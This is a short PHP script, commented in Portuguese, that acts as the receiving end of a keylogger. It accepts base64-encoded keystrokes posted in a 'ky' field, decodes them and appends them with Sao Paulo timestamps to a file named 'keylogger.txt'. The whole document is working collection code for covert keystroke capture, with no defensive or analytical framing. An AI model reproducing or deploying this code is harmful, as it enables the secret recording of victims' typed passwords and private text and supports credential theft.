<?php

// nome do arquivo
$filename = 'keylogger.txt';
// pegar hora e data de acordo com o fuso horario de São paulo
date_default_timezone_set('America/Sao_Paulo');

// se o arquivo não existir 
if(!file_exists($filename)){
    // crie - o
    fopen($filename, 'w');
}
 
if(!empty(base64_decode($_POST['ky']))){
    $file = fopen($filename, 'a+');
    fwrite($file, (date('Y-m-d H:i:s').": '".base64_decode($_POST['ky'])."'\r\n"));
}
 
if(!empty($_POST['wr'])){
    $file = fopen($filename, 'a+');
    fwrite($file, (base64_decode($_POST['ky'])."\r\n"));
}

?>